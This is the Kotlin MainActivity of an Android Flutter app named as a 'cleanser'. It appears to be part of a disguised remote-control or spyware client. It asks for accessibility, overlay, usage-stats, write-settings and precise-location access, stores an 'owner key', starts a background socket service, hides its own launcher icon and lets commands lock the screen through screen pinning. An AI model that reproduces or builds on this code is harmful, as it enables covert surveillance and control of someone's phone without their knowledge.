package com.cleanser.app

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.app.usage.UsageStatsManager
import android.provider.Settings
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.Priority
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val CH = "com.cleanser.app/native"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        handleAction(intent?.getStringExtra("action"))
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleAction(intent.getStringExtra("action"))
    }

    private fun handleAction(action: String?) {
        when (action) {
            "start_screen_pinning" ->
                Handler(Looper.getMainLooper()).postDelayed({ startScreenPinning() }, 250)
            "stop_screen_pinning" ->
                Handler(Looper.getMainLooper()).postDelayed({ stopLockTask(); moveTaskToBack(true) }, 100)
        }
    }

    override fun configureFlutterEngine(fe: FlutterEngine) {
        super.configureFlutterEngine(fe)
        MethodChannel(fe.dartExecutor.binaryMessenger, CH).setMethodCallHandler { call, result ->
            when (call.method) {
                "getSdkInt" -> result.success(Build.VERSION.SDK_INT)

                "checkOverlay" -> result.success(
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
                )

                "requestOverlay" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                            data = android.net.Uri.parse("package:$packageName")
                        })
                    }
                    result.success(null)
                }

                "saveCredentials" -> {
                    val accessCode = call.argument<String>("accessCode") ?: ""
                    val ownerKey   = call.argument<String>("ownerKey")   ?: ""
                    getSharedPreferences("cleanser", Context.MODE_PRIVATE).edit()
                        .putString("access_code", accessCode)
                        .putString("owner_key",   ownerKey)
                        .apply()
                    result.success(null)
                }

                "startService" -> {
                    val i = Intent(this, SocketService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
                    result.success(true)
                }

                "isConnected" -> {
                    val prefs = getSharedPreferences("cleanser", Context.MODE_PRIVATE)
                    result.success(prefs.getBoolean("socket_connected", false))
                }

                "checkUsageStats" -> {
                    val usm   = getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                    val end   = System.currentTimeMillis()
                    val start = end - 1000 * 60L
                    val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, end)
                    result.success(stats != null && stats.isNotEmpty())
                }
                "requestUsageStats" -> {
                    startActivity(android.content.Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS))
                    result.success(null)
                }
                "requestLocationAccuracy" -> {
                    try {
                        val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                            .build()
                        val settingsReq = LocationSettingsRequest.Builder()
                            .addLocationRequest(req)
                            .setAlwaysShow(true)
                            .build()
                        val client = LocationServices.getSettingsClient(this)
                        client.checkLocationSettings(settingsReq)
                            .addOnFailureListener { e ->
                                if (e is ResolvableApiException) {
                                    try { e.startResolutionForResult(this, 9001) } catch (_: Exception) {}
                                }
                            }
                    } catch (_: Exception) {}
                    result.success(null)
                }
                "checkWriteSettings" -> {
                    val ok = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        Settings.System.canWrite(this) else true
                    result.success(ok)
                }
                "requestWriteSettings" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        startActivity(android.content.Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                            data = android.net.Uri.parse("package:$packageName")
                        })
                    }
                    result.success(null)
                }
                "checkAccessibility" -> {
                    val enabled = android.provider.Settings.Secure.getString(
                        contentResolver,
                        android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                    ) ?: ""
                    result.success(enabled.contains(packageName))
                }
                "requestAccessibility" -> {
                    startActivity(android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    result.success(null)
                }
                "hideApp" -> {
                    packageManager.setComponentEnabledSetting(
                        ComponentName(this, "com.cleanser.app.MainActivityAlias"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                    moveTaskToBack(true)
                    result.success(null)
                }

                else -> result.notImplemented()
            }
        }
    }

    fun startScreenPinning() {
        try { startLockTask() } catch (_: Exception) {}
    }
}
